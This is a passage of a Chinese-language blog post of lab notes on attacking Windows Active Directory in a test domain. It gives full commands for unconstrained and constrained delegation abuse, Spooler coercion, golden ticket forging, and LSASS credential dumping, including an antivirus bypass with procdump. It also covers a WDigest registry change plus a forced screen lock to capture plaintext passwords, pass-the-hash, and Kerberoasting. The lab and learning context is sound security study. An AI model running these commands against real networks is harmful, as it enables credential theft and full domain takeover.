使用域控权限创建用户并授予服务权限setspn -A https&#x2F;web web #添加用户为服务账号setspn -d https&#x2F;web web #删除用户服务账号权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912091053783.png" alt="image-20220912091053783"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912091133301.png" alt="image-20220912091133301"></p><ul><li>为使设置生效，可重启一遍</li><li>当服务账号或者主机被设置为非约束性委派时，其<mark> userAccountControl</mark> 属性会包含<mark> TRUSTED_FOR_DELEGATION</mark></li></ul><h3 id="23-powershell查询非委派约束"><a class="markdownIt-Anchor" href="#23-powershell查询非委派约束">#</a> 2.3 powershell 查询非委派约束</h3><ul><li>使用 powershell 脚本在<mark>普通域用户</mark>（12server1）权限下执行查询哪些主机和用户被设置了非约束委派</li><li>powerview2.ps1 或者 powerview.ps1</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#导入ps模块</span><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1<span class="token comment">#查询非约束主机</span><span class="token function">Get-NetComputer</span> <span class="token operator">-</span>Unconstrained <span class="token operator">-</span>Domain redteam<span class="token punctuation">.</span>club<span class="token comment">#查询非约束用户</span><span class="token function">Get-NetUser</span> <span class="token operator">-</span>Unconstrained <span class="token operator">-</span>Domain redteam<span class="token punctuation">.</span>club <span class="token punctuation">|</span> <span class="token function">select</span> name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="24-adfind查询非约束委派"><a class="markdownIt-Anchor" href="#24-adfind查询非约束委派">#</a> 2.4 adfind 查询非约束委派</h3><ul><li>使用 adfind.exe 在普通域用户 ==（12server1）权限下执行查询哪些主机和用户被设置了非约束委派</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">#非约束委派主机AdFind.exe -b &quot;DC&#x3D;redteam,DC&#x3D;club&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; cn distinguishedName#非约束委派用户AdFind.exe -b &quot;DC&#x3D;redteam,DC&#x3D;club&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; cn distinguishedName<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912093555051.png" alt="image-20220912093555051"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912092935099.png" alt="image-20220912092935099"></p><h3 id="25-非约束委派攻击"><a class="markdownIt-Anchor" href="#25-非约束委派攻击">#</a> 2.5 非约束委派攻击</h3><ul><li>首先使用 12server2 ping ad1，能够 ping 通，且使用 dir 命令查看 ad1 的 C 盘文件无法访问</li><li>域管理员用户使用 winrm 服务器远程连接委派主机 12server2，连接成功后如下图</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Enter-PSSession</span> <span class="token operator">-</span>ComputerName 12server2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912093830343.png" alt="image-20220912093830343"></p><ul><li>此时域管的凭证已经存储到委派域成员用户的内存中，在提权到<mark>本地管理员用户</mark>后使用 mimikatz 导出相关凭证（在 12server2 中导出）</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">privilege::debug #进入调试模式sekurlsa::tickets &#x2F;export #导出凭证<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912094154442.png" alt="image-20220912094154442"></p><ul><li>使用 mimikatz 将 krbtgt 的票据导入</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kerberos::ptt 凭证名称 <span class="token comment">#导入凭证</span>kerberos::list <span class="token comment">#查看当前存在凭证</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912094359734.png" alt="image-20220912094359734"></p><ul><li>获取到该凭证之后，可以将此凭证保存下来，上传到 12server1 中使用 12server1 的域普通成员用户使用 mimikatz 进行导入，导入后同样可在域内访问任意主机和服务</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912094815721.png" alt="image-20220912094815721"></p><ul><li>非约束委派就是将一个主机或用户设为非约束委派状态，诱导域控主机访问，访问后委派用户就会有域控的凭证，使用 mimikatz 导出这个凭证之后再将凭证导入到其他普通域成员主机中，就可以获取域控权限</li></ul><h3 id="26-非约束委派spooler"><a class="markdownIt-Anchor" href="#26-非约束委派spooler">#</a> 2.6 非约束委派 &amp; Spooler</h3><ul><li>上文中的非约束委派需要域管理员主动访问委派主机或用户，才能获取相关凭证，比较鸡肋，可以使用<strong>非约束委派 + Spooler 打印机服务</strong>强制指定的主机进行连接</li><li>Spooler：打印系统远程协议（MS-RPRN），一种旧的但是<mark>默认启用</mark>的服务</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912190918152.png" alt="image-20220912190918152"></p><ul><li>在该方法中，域用户可以使用 <code>MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex)</code>  方法强制任何运行了 Spooler 服务的计算机以通过<strong> Kerberos 或 NTLM</strong> 对攻击者选择的目标进行身份验证</li></ul><hr><ul><li>攻击复现环境<ul><li>域：redteam.club</li><li>域控：ad2</li><li>备份域控：ad1</li><li>域内主机：12server1、12server2</li></ul></li><li>攻击条件：攻击者控制了一个开启了非约束委派的账户并<mark>获取了本地管理员权限</mark>，域控开启了 Spooler 服务<ul><li>拿下一个具有 Kerberos 非约束委派的主机 (主机账户)</li><li>找到一台运行 Print Spooler 服务 (默认为自启而且为 System 权限) 的 DC</li><li>管理员身份使用 Rubeus 的监听模式</li></ul></li></ul><ol><li><p>以本地管理员权限开启<strong> Rubeus 监听</strong></p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">runas &#x2F;user:12server2\administrator cmd.exe #在cmd中输入密码切换为本地管理员权限Rubeus.exe monitor &#x2F;interval:1 &#x2F;filteruser:ad2$# 我们可以用Rubeus来监听Event ID为4624事件，这样可以第一时间截取到域控的TGT# &#x2F;interval:1 设置监听间隔1秒# &#x2F;filteruser 监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的TGT# DC$为域控的主机名字加$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用 Spoolsamlpe.exe 利用打印机服务让域控机向本机验证身份</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">spoolsample.exe ad2 12server2# 表示利用打印服务强制让域控机向admin-PC主机验证身份，这样我们的Rubeus就可以监听到TGS了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912192553430.png" alt="image-20220912192553430"></p><p>tips：为便于复制方便，Rubeus 监听可写为</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">Rubeus.exe monitor &#x2F;interval:1 &#x2F;filteruser:ad2$ &gt; log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912192828951.png" alt="image-20220912192828951"></p><p>然后可直接使用记事本的编辑 - 查找和替换删掉开头的空格</p></li><li><p>将 TGT 使用 powershell 直接运行转换到正常的 TGT，这样就可以得到正常的 TGT</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token namespace">[IO.File]</span>::WriteAllBytes<span class="token punctuation">(</span><span class="token string">"ticket.kirbi"</span><span class="token punctuation">,</span> <span class="token namespace">[Convert]</span>::FromBase64String<span class="token punctuation">(</span><span class="token string">"得到的base64"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912193148733.png" alt="image-20220912193148733"></p></li><li><p>将这个 TGT 票据注入到当前会话中，导出域控的所有 hash，就可以获得 krbtgt 的 hash</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd"># mimikatz以域用户身份运行kerberos::ptt ticket.kirbimimikatz.exe &quot;lsadump::dcsync &#x2F;domain:redteam.club &#x2F;all &#x2F;csv&quot; &quot;exit&quot; &gt; hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912193541403.png" alt="image-20220912193541403"></p></li></ol><ul><li>注意：<strong>我们这儿获得的 TGT 票据，不能算黄金票据，因为我们获得的权限只是域控的本地管理权限，所以 *<em> 不能连接域控 *</em>，但是我们确可以因此获取所以用户的 hash，所以能制作真正的黄金票据～</strong></li></ul><h3 id="27-spooler制作黄金票据"><a class="markdownIt-Anchor" href="#27-spooler制作黄金票据">#</a> 2.7 Spooler 制作黄金票据</h3><ul><li>通过上述获取了 krbtgt 的 hash 之后，再获取本账号的 SID，就可以制作黄金票据</li></ul><ol><li><p>获取本账号的 sid</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">whoami &#x2F;domain 或 whoami &#x2F;user#S-1-5-21-2365300756-2663045586-4193326672-1105 注意不要后面的1105<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>使用 mimikatz 制作黄金票据</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">mimikatz &quot;kerberos::golden &#x2F;domain:redteam.club &#x2F;sid:S-1-5-21-2365300756-2663045586-4193326672 &#x2F;krbtgt:b6e0fcce3106665064de4917394ccc27 &#x2F;user:administrator &#x2F;ticket:ntlm.kirbi&quot; &quot;exit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用 mimikatz 导入票据</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">mimikatz &quot;kerberos::purge&quot; &quot;kerberos::ptt ntlm.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912194336002.png" alt="image-20220912194336002"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912194412658.png" alt="image-20220912194412658"></p></li></ol><ul><li>因为有了黄金票据，可以直接使用 PsExec 反弹任意主机的 shell 且不需要密码，并且获取到的<mark>都是域控权限</mark></li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">PsExec64.exe \\ad1 cmd -accepteula<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912194646559.png" alt="image-20220912194646559"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220912194902540.png" alt="image-20220912194902540"></p><h2 id="3-约束委派攻击"><a class="markdownIt-Anchor" href="#3-约束委派攻击">#</a> 3、约束委派攻击</h2><h3 id="31-约束委派介绍"><a class="markdownIt-Anchor" href="#31-约束委派介绍">#</a> 3.1 约束委派介绍</h3><ul><li>由于非约束委派的不安全性，引入了约束委派，对 kerberos 协议进行了扩展，加入 S4U，其中 S4U 支持两个子协议：Service for User to Self (S4U2Self) 和 Service for User to Proxy ( S4U2proxy )，这两个扩展都允许服务代表用户从 KDC 请求票证。 S4U2self 可以代表自身请求针对其自身的可转发的 Kerberos 服务票据 (ST1) ； S4U2proxy 可以以用户的名义请求其它服务的 ST2 ，约束委派就是限制了 S4U2proxy 扩展的范围。</li></ul><h3 id="32-约束委派流程"><a class="markdownIt-Anchor" href="#32-约束委派流程">#</a> 3.2 约束委派流程</h3><ul><li>user 访问 serviceA，向 DC 发起 kerberos 认证，域控返回 user 的 TGT 和 ST1 票据，user 使用 ST1 票据对 serviceA 进行访问；<br>如果配置了 serviceA 到 serviceB 的约束委派，则 serviceA 能使用 S4U2Proxy 协议将用户发给自己的可转发的 ST1 票据以用户的身份发给 DC；DC 返回 serviceA 一个用来访问 serviceB 的 ST2 票据，这样 serviceA 就能以用户的身份对 serviceB 发起访问。</li></ul><h3 id="33-攻击原理"><a class="markdownIt-Anchor" href="#33-攻击原理">#</a> 3.3 攻击原理</h3><ul><li>由于服务用户只能获取某个用户（或主机）的服务的 ST1 而非 TGT ， 所以只能模拟用户访问特定的服务 ；但是如果能够拿到约束委派用户（或主机）的明文密码或 hash，那么就可以伪造 S4U 的请求，伪装成服务用户以任意用户的权限申请访问指定服务的 ST2。</li></ul><h3 id="34-攻击复现"><a class="markdownIt-Anchor" href="#34-攻击复现">#</a> 3.4 攻击复现</h3><ol><li><p>ad2 添加一个 websec 用户，并将其设置为服务用户</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">setspn -A cifs&#x2F;12server2.redteam.club websec #将websec用户加上spn标识变成服务用户<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913085413087.png" alt="image-20220913085413087"></p><ul><li><p>已知在约束委派的情况下，服务用户只能获取某个用户或者主机的服务 ST，只能用模拟用户访问特定的服务， 是无法获取用户的 TGT 的，如果能够获得到开启了约束委派的服务的用户的明文密码或者 hash 就可以伪造 S4U 的请求，进而伪造服务用户以任意账户的权限访问服务的 ST</p></li><li><p>约束用户 有 TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION 关键字段</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913085924511.png" alt="image-20220913085924511"></p></li></ul></li><li><p>12server2<strong> 普通域用户</strong>使用<strong> AdFind</strong> 工具使用命令查询存在的约束账户</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd"># 查询委派用户AdFind.exe -b &quot;DC&#x3D;redteam,DC&#x3D;club&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; cn distinguishedName msds-allowedtodelegateto# 查询委派主机AdFind.exe -b &quot;DC&#x3D;redteam,DC&#x3D;club&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(msds-allowedtodelegateto&#x3D;*))&quot; cn distinguishedName msds-allowedtodelegateto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913090108654.png" alt="image-20220913090108654"></p></li><li><p>12server2 使用 kekeo 请求服务用户的 TGT，需要已知<strong>明文密码或 hash</strong>，<mark>普通域用户权限即可</mark></p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">tgt::ask &#x2F;user:websec &#x2F;domain:redteam.club &#x2F;password:QWEasd123 &#x2F;ticket:test.kirbi  #使用明文密码请求tgt::ask &#x2F;user:websec &#x2F;domain:redteam.club &#x2F;NTLM:XXXXX #使用hash请求<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913090338022.png" alt="image-20220913090338022"></p></li><li><p>使用 kekeo 利用这个票据通过伪造 S4U 请求以 administrator 身份访问 websec 的 ST</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">tgs::s4u &#x2F;tgt:TGT_websec@REDTEAM.CLUB_krbtgt~redteam.club@REDTEAM.CLUB.kirbi &#x2F;user:Administrator@redteam.club &#x2F;service:cifs&#x2F;ad1.redteam.club#tgt：导出的服务用户TGT#user：要伪造的用户#service：服务&#x2F;目标主机.域名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913090712392.png" alt="image-20220913090712392"></p></li><li><p>这时候 kekeo 当前路径下会出现 administrator 的 ticket (用于访问 websec 的 CIFS 服务), 将这个凭证导入访问 websec 的 cifs 服务</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">keberos::ptt 凭证 #导入凭证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913091104125.png" alt="image-20220913091104125"></p></li></ol><h3 id="35-小结"><a class="markdownIt-Anchor" href="#35-小结">#</a> 3.5 小结</h3><ul><li>当我们查询到约束委派的用户时，并知晓它的明文密码或 NTLM hash，才能利用工具请求它的 TGT；</li><li>然后利用这个 TGT，伪造 S4U 请求以 administrator 身份去访问这个服务账号的 ST；</li><li>这里可以生成任意权限身份的 ticket，我们是以 administrator 身份去访问的，所以生成的就是 administrator 的 ticket，这个就是 ST2；最后使用工具导入这个 ST2，那我们就能够成功访问域控；通常约束委派多数用于用户权限维持。</li></ul><h2 id="4-基于资源的约束委派-空"><a class="markdownIt-Anchor" href="#4-基于资源的约束委派-空">#</a> 4、基于资源的约束委派 # 空</h2><h1 id="获取域控权限"><a class="markdownIt-Anchor" href="#获取域控权限">#</a> 获取域控权限</h1><p>在域渗透中、作为渗透测试人员，获取域控的权限基本上可以获取整个内网的权限</p><h2 id="1-高权限读取本地密码"><a class="markdownIt-Anchor" href="#1-高权限读取本地密码">#</a> 1、高权限读取本地密码</h2><ul><li>当域管理员在域成员机器上登录进行工作的时候，会将明文密码保存在本地进行的 lsass.exe，可以通过 mimikatz 来读取到本地的明文密码</li><li>利用条件：获取域主机的<mark>本地管理员权限</mark>，<strong>域管理员在本机上登录过</strong></li><li>在无杀软的情况下使用<strong> mimikatz</strong> 直接读取</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">privilege::debug #提权sekurlsa::logonpasswords #导出hashmimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt #直接在cmd执行导出到文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913201753215.png" alt="image-20220913201753215"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220913203750880.png" alt="image-20220913203750880"></p><ul><li>在有杀软的情况下可以通过 procdump+mimikatz 的方式进行绕过<ul><li>procdump64.exe 是微软自带的工具，可直接搜索下载</li></ul></li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">#1、导出lsass.exeprocdump64.exe -accepteula -ma lsass.exe lsass.dmp#2、将lsass.exe导出的dmp文件保存到本地，使用mimikatz读取mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot; &gt; log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>如果目标机器是 windows server 2012，通过添加注册表，在通过锁屏，让管理员重新登录即可读取明文</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">#添加注册表，设置UseLogonCredential设置为1reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f#利用一下powershell脚本进行锁屏Function Lock-WorkStation&#123;    $signature &#x3D; @&quot;    [DllImport(&quot;user32.dll&quot;, SetLastError &#x3D; true)]    public static extern bool LockWorkStation();    &quot;@    $LockWorkStation &#x3D; Add-Type -memberDefinition $signature -name    &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru    $LockWorkStation::LockWorkStation() | Out-Null&#125;Lock-WorkStation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>获取密码后可以通过 net use 命令进行明文连接，或使用 impacket 包下的 wmiexec.py 进行哈希连接，或导入 mimikatz 进行访问</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">#net use 明文连接net use \\10.10.10.137\ipc$ &quot;123456&quot; &#x2F;user:redteam\administrator#wmiexec.py hash连接python3 wmiexec.py -hashes 00000000000000000000000000000000:a5843d3ee2da05158aaf16ecb3ba969b administrator@10.10.10.137 &quot;whoami&quot;python3 wmiexec.py -hashes 00000000000000000000000000000000:a5843d3ee2da05158aaf16ecb3ba969b administrator@10.10.10.137<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-sysvol组策略获取密码"><a class="markdownIt-Anchor" href="#2-sysvol组策略获取密码">#</a> 2、SYSVOL 组策略获取密码</h2><ul><li>由于需要多域环境，无法演示</li></ul><h2 id="3-kerberoasting"><a class="markdownIt-Anchor" href="#3-kerberoasting">#</a> 3、Kerberoasting</h2><ul><li><p>SPN 为服务主体名称，是服务实列 (MSSQL,HTTP 等) 的唯一标识，如果在林中安装服务的多个实列，每个实列都有自己的 SPN，如果 kerberos 服务票证的加密类型为 RC4_HMAC_MD5，就可以导出 TGS 对其进行离线破解，就有可能获取到域用户的密码</p></li><li><p>原理：当域内某个用户去请求同域内的某个服务资源时，请求会首先被送达 KDS 的 AS 中进行身份认证，认证通过后 AS 会返回一个用用户密码 hash 加密的 TGT 给用户，然后用户再拿着 这个 TGT 向 TGS 去请求，TGS 会返回一个用对应服务账号的密码 hash 加密过 (RC4_HMAC_MD5) 的专门用于访问特定服务的服务票据，最后，用户只需拿这张服务票据去访问对应的服务资源即可，而问题就出在 TGS 返回服务票据，目标服务此时用的是一个域账号来运行的，那么 TGS 在向用户返回服务票据时，用户就可以拿到这张服务票据中的 hash，由于 TGS 服务票据加密算法已知，尝试穷举口令，模拟加密过程，生成 TGS 进行比较。如果 TGS 相同，代表口令正确，就能获得目标服务实例的明文口令</p></li><li><p>使用 setspn 查询 spn (windows7 和 server2008 默认自带)，这是正常 kerberos 票据行为的一部分，因此查询 SPN 的操作很难被检测</p></li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">setspn.exe -q *&#x2F;* #查询所有SPNsetspn.exe -T test -q *&#x2F;* #-T:查询指定域#以CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915153555300.png" alt="image-20220915153555300"></p><ul><li>查询域内注册的 SPN (GetUserSPNs.vbs 脚本)</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">cscript GetUserSPNs.vbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915153729458.png" alt="image-20220915153729458"></p><ul><li>使用 powerview.ps1 脚本查询域内注册的 SPN</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1<span class="token function">Get-NetUser</span> <span class="token operator">-</span>spn <span class="token operator">-</span>AdminCount<span class="token punctuation">|</span><span class="token function">Select</span> name<span class="token punctuation">,</span>whencreated<span class="token punctuation">,</span>pwdlastset<span class="token punctuation">,</span>lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915154339656.png" alt="image-20220915154339656"></p><ul><li>给 mySQL 服务注册 SPN</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">setspn -s mysql&#x2F;12server4.redteam.club:3306 test#-s：服务名&#x2F;主机全名 端口 用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>将 kerberos 的加密方式换成 RC4_HMAC_MD5—— 位于服务器管理 - 工具 - 组策略管理</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915155150688.png" alt="image-20220915155150688"></p><h3 id="31-使用mimikatz配合脚本穷举"><a class="markdownIt-Anchor" href="#31-使用mimikatz配合脚本穷举">#</a> 3.1 使用 mimikatz 配合脚本穷举</h3><ul><li>请求指定的 TGS，完成之后 klist 就能查看相应的票据</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Add-Type</span> <span class="token operator">-</span>AssemblyName System<span class="token punctuation">.</span>IdentityModel<span class="token function">New-Object</span> System<span class="token punctuation">.</span>IdentityModel<span class="token punctuation">.</span>Tokens<span class="token punctuation">.</span>KerberosRequestorSecurityToken <span class="token operator">-</span>ArgumentList <span class="token string">"mysql/12server4.redteam.club:3306"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915155619214.png" alt="image-20220915155619214"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915155736516.png" alt="image-20220915155736516"></p><ul><li>使用 mimikatz 导出票据</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">kerberos::list &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915155903221.png" alt="image-20220915155903221"></p><ul><li>将文件导入 kali 中使用 tgsrepcrack.py 破解密码</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 tgsrepcrack.py wordlist.txt mssql.kirbi<span class="token comment">#wordlist.txt是密码列表</span><span class="token comment">#mssql.kirbi是凭证文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915161335573.png" alt="image-20220915161335573"></p><ul><li><strong>如果服务的创建者是域管理员用户，有概率破解出域管理员的明文密码</strong></li></ul><h3 id="32-使用hashcat穷举"><a class="markdownIt-Anchor" href="#32-使用hashcat穷举">#</a> 3.2 使用 hashcat 穷举</h3><ul><li>使用 <code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>  请求 TGS，在返回结果中提取出 TGS，输出的 TGS 可选择 John the Ripper 或 Hashcat 进行破解。</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">.</span>\<span class="token function">Invoke-Kerberoast</span> <span class="token operator">-</span>OutputFormat Hashcat <span class="token comment">#查看所有信息</span><span class="token punctuation">.</span>\<span class="token function">Invoke-Kerberoast</span> <span class="token operator">-</span>OutputFormat Hashcat <span class="token punctuation">|</span> <span class="token function">Select</span> hash <span class="token punctuation">|</span> <span class="token function">ConvertTo-CSV</span> <span class="token operator">-</span>NoTypeInformation <span class="token comment">#只查看hash信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><mark><strong>powershell 未导出信息</strong></mark></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915162354441.png" alt="image-20220915162354441"></p><ul><li>使用 rubeus.exe 提取出 hash</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">Rubeus.exe kerberoast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915162415801.png" alt="image-20220915162415801"></p><ul><li>使用 kali 自带 hashcat 对该 hash 进行穷举</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat -m <span class="token number">13100</span> kerberos.txt ./kerberoast-master/MimiPwds.txt -o found.txt --force<span class="token comment">#未复现成功。。。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-内网协议ntlm之内网大杀器cve-2019-1040漏洞"><a class="markdownIt-Anchor" href="#4-内网协议ntlm之内网大杀器cve-2019-1040漏洞">#</a> 4、内网协议 NTLM 之内网大杀器 CVE-2019-1040 漏洞</h2><ul><li>前面基于资源的域委派没学，后期补齐</li></ul><h2 id="5-cve-2020-1472-zerologon"><a class="markdownIt-Anchor" href="#5-cve-2020-1472-zerologon">#</a> 5、CVE-2020-1472-ZeroLogon</h2><h3 id="51-简介"><a class="markdownIt-Anchor" href="#51-简介">#</a> 5.1 简介</h3><ul><li>Netlogon 使用的 AES 认证算法中的 vi 向量默认为 0，导致攻击者可以绕过认证，同时其设置域控密码的远程接口也使用了该函数，导致可以将域控中保存在 AD 中的管理员 password 设置为空</li></ul><h3 id="52-影响版本"><a class="markdownIt-Anchor" href="#52-影响版本">#</a> 5.2 影响版本</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" 